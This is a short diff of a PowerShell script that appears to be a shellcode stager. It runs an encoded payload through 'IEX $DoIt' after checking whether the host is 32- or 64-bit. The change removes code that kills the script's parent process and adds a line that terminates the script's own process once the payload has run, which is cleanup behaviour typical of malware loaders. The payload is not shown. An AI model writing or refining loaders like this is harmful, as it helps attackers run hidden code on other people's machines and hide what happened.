@@ -1,16 +1,3 @@
-$instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$pid'"
-$pid
-$powershellid = $instance.ParentProcessId
-$powershellid
-$killid = $null
-
-$killid = $powershellid
-
-if($killid -ne $null)
-{
-        Get-WmiObject Win32_Process -Filter "ProcessId = '$killid'" | ForEach-Object{$_.Terminate()  | Out-Null }
-}
-
 
 Set-StrictMode -Version 2
 
@@ -60,3 +47,4 @@ If ([IntPtr]::size -eq 8) {
 else {
 	IEX $DoIt
 }
+Get-WmiObject Win32_Process -Filter "ProcessId = '$pid'" | ForEach-Object{$_.Terminate()  | Out-Null }
